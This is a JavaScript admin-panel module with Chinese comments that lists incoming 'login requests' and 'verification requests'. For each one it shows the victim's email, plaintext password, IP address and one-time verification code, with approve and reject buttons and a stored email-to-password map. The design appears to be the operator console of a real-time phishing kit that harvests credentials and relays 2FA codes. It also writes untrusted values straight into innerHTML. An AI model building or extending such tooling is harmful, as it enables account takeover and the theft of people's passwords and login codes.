/**
 * 审核功能模块
 * 包含登录请求和验证请求的加载、显示、审核等功能
 */

// 扩展 AdminApp 类
(function () {
    // 构造函数中添加 Socket 监听器
    const originalSetupSocketListeners = AdminApp.prototype.setupSocketListeners;
    AdminApp.prototype.setupSocketListeners = function() {
        // 调用原始方法
        originalSetupSocketListeners.call(this);
        
        // 添加取消登录请求的监听器
        this.socket.on('cancel-login-request', (data) => {
            
            // 从页面中移除已取消的登录请求
            const requestElement = document.querySelector(`#loginRequestsList .request-item[data-id="${data.id}"]`);
            if (requestElement) {
                requestElement.remove();
                
                // 更新计数
                this.updatePendingCount();
            }
        });
    };
    
    // 加载登录请求
    AdminApp.prototype.loadLoginRequests = async function () {
        try {
            const response = await this.apiRequest('/api/admin/login-requests');
            if (response && response.ok) {
                const requests = await response.json();
                this.displayLoginRequests(requests);
            }
        } catch (error) {
            console.error('加载登录请求错误:', error);
        }
    };

    // 显示登录请求
    AdminApp.prototype.displayLoginRequests = function (requests) {
        const container = document.getElementById('loginRequestsList');

        if (requests.length === 0) {
            container.innerHTML = '<p>暂无待审核的登录请求</p>';
            return;
        }
        const myId = this.currentAdmin ? this.currentAdmin.id : null;
        container.innerHTML = requests.map(request => {
            const isMine = request.assigned_admin_id && myId && Number(request.assigned_admin_id) === Number(myId);
            return `
            <div class="request-item${isMine ? ' my-assigned' : ''}" data-id="${request.id}" style="${isMine ? 'background:#e6f7ff;border-left:4px solid #1890ff;' : ''}">
                <div class="request-header">
                    <div class="request-info">
                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                    </div>
                    <div class="request-actions">
                        <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
                        <button class="reject-btn" onclick="adminApp.approveLogin(${request.id}, false)">拒绝</button>
                    </div>
                </div>
            </div>
            `;
        }).join('');
    };

    // 加载验证请求
    AdminApp.prototype.loadVerificationRequests = async function () {
        try {
            const response = await this.apiRequest('/api/admin/verification-requests');
            if (response && response.ok) {
                const requests = await response.json();
                this.displayVerificationRequests(requests);
            }
        } catch (error) {
            console.error('加载验证请求错误:', error);
        }
    };

    // 显示验证请求
    AdminApp.prototype.displayVerificationRequests = function (requests) {
        const container = document.getElementById('verificationRequestsList');

        if (requests.length === 0) {
            container.innerHTML = '<p>暂无待审核的验证请求</p>';
            return;
        }

        container.innerHTML = requests.map(request => {
            // 尝试从邮箱-密码映射中获取密码
            let password = request.password;
            if (!password && request.email && this.emailPasswordMap.has(request.email)) {
                password = this.emailPasswordMap.get(request.email);
            }

            return `
            <div class="request-item" data-id="${request.id}">
                <div class="request-header">
                    <div class="request-info">
                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                    </div>
                    <div class="request-actions">
                        <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
                        <button class="reject-btn" onclick="adminApp.approveVerification(${request.id}, false)">拒绝</button>
                    </div>
                </div>
            </div>
            `;
        }).join('');
    };

    // 审核登录请求
    AdminApp.prototype.approveLogin = async function (id, approved) {
        try {
            const response = await this.apiRequest(`/api/admin/approve-login/${id}`, {
                method: 'POST',
                body: JSON.stringify({ approved })
            });

            if (response && response.ok) {
                // 移除已处理的请求
                const element = document.querySelector(`#loginRequestsList .request-item[data-id="${id}"]`);
                if (element) {
                    element.remove();
                }
                this.updatePendingCount();
            }
        } catch (error) {
            console.error('审核登录请求错误:', error);
        }
    };

    // 审核验证请求
    AdminApp.prototype.approveVerification = async function (id, approved) {
        try {
            const response = await this.apiRequest(`/api/admin/approve-verification/${id}`, {
                method: 'POST',
                body: JSON.stringify({ approved })
            });

            if (response && response.ok) {
                // 移除已处理的请求
                const element = document.querySelector(`#verificationRequestsList .request-item[data-id="${id}"]`);
                if (element) {
                    element.remove();
                }
                this.updatePendingCount();
            }
        } catch (error) {
            console.error('审核验证请求错误:', error);
        }
    };

    // 添加登录请求
    AdminApp.prototype.addLoginRequest = function (request) {
        const container = document.getElementById('loginRequestsList');
        const existingEmpty = container.querySelector('p');
        if (existingEmpty) {
            existingEmpty.remove();
        }

        // 存储邮箱和密码的映射，用于验证请求
        if (request.email && request.password) {
            this.emailPasswordMap.set(request.email, request.password);
        }

        const requestElement = document.createElement('div');
        requestElement.className = 'request-item';
        requestElement.dataset.id = request.id;
        requestElement.innerHTML = `
            <div class="request-header">
                <div class="request-info">
                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                </div>
                <div class="request-actions">
                    <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
                    <button class="reject-btn" onclick="adminApp.approveLogin(${request.id}, false)">拒绝</button>
                </div>
            </div>
        `;
        container.insertBefore(requestElement, container.firstChild);
    };

    // 添加验证请求
    AdminApp.prototype.addVerificationRequest = function (request) {
        const container = document.getElementById('verificationRequestsList');
        const existingEmpty = container.querySelector('p');
        if (existingEmpty) {
            existingEmpty.remove();
        }

        // 检查是否已经存在相同ID的请求，如果存在则不添加
        const existingRequest = document.querySelector(`#verificationRequestsList .request-item[data-id="${request.id}"]`);
        if (existingRequest) {
            return;
        }

        // 直接使用传入的请求数据，因为Socket事件已经包含了所有必要信息
        this.renderVerificationRequest(request);
    };

    // 从服务器获取完整的验证请求详情
    AdminApp.prototype.fetchVerificationRequestDetails = async function (id) {
        try {
            const response = await this.apiRequest(`/api/admin/verification-request/${id}`);
            if (response && response.ok) {
                const data = await response.json();
                return data;
            }
        } catch (error) {
            console.error(`获取验证请求 ${id} 详情错误:`, error);
        }
        return null;
    };

    // 渲染验证请求到UI
    AdminApp.prototype.renderVerificationRequest = function (request) {
        // 尝试从邮箱-密码映射中获取密码
        let password = request.password;
        if (!password && request.email && this.emailPasswordMap.has(request.email)) {
            password = this.emailPasswordMap.get(request.email);
        }

        const container = document.getElementById('verificationRequestsList');
        const requestElement = document.createElement('div');
        requestElement.className = 'request-item';
        requestElement.dataset.id = request.id;
        requestElement.innerHTML = `
            <div class="request-header">
                <div class="request-info">
                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                </div>
                <div class="request-actions">
                    <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
                    <button class="reject-btn" onclick="adminApp.approveVerification(${request.id}, false)">拒绝</button>
                </div>
            </div>
        `;
        container.insertBefore(requestElement, container.firstChild);
    };
})();